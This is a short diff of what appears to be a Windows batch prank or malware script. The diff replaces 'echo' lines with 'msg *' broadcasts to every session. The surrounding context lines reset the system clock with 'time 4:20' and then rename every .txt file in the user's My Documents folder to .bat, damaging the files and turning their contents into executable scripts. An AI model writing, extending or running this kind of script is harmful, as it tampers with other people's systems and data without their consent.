@@ -52,13 +52,13 @@ cls
 time 4:20
 cls
 
-echo lmao part 3
+msg * lmao part 3
 pause
-echo lmao part 4
+msg * lmao part 4
 pause
-echo lmao part 5
+msg * lmao part 5
 pause
-echo lmao part 6
+msg * lmao part 6
 cls
 cd %userprofile%\my documents
 ren *.txt *.bat
